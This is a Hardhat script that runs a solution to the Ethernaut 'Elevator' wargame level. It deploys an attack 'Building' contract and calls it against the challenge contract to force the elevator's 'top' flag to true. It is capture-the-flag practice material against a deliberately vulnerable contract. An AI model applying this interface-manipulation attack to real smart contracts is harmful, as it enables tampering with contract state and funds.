const { ethers } = require("hardhat");
const Runner = require('./lib/runner');
const Deployer = require('./deployer');

Runner.run(async () => { 
    
    //PLACE FALLBACK CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const elevatorAddr = "0x7C2e36e80aF983928F3af041Fc04fed7bA312A21";
    
    const elevator = await ethers.getContractAt("Elevator", elevatorAddr);
    
    //if building is already pre-deployed, comment out this line and uncomment the subsequent line, 
    //  plugging in the correct address 
    const building = await Deployer.deploy();
    
    console.log();
    console.log("* * * ");
    console.log(`elevator is at top?: ${await elevator.top()}`);
    
    //invoke the contract with attack contract address
    await building.goToTop(elevatorAddr);
    
    //verify that 'top' is true 
    console.log(`elevator is at top?: ${await elevator.top()}`);
    console.log("* * * ");
});
